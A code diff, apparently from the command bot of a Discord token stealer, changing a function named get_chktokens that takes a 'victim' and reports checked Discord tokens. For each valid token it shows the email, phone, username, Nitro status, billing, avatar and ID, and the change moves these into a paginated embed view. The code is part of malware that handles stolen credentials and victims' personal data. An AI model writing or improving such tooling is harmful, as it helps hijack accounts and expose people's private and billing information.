@@ -254,8 +254,19 @@ async def get_chktokens(ctx, victim):
 
         if len(valid) == 0: 
             return await ctx.followup.send(embed = genEmbed("No valid Discord Tokens", datetime.now()))
+        embeds = []
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
-            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
+            embeds.append(checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
+        
+        embeds.append(checked_embeds("a", "a", 0, "a", "a", "a", "a", "a"))
+        
+        if len(embeds) <= 1:
+            await ctx.channel.send(embed=embeds[0])
+        else:
+            author_id = ctx.author.id
+            print(author_id)
+            await ctx.channel.send(embed=embeds[0], view=CreatePaginator(ctx, embeds, author_id))
+        
         await ctx.followup.send("Checked all tokens")
 
 
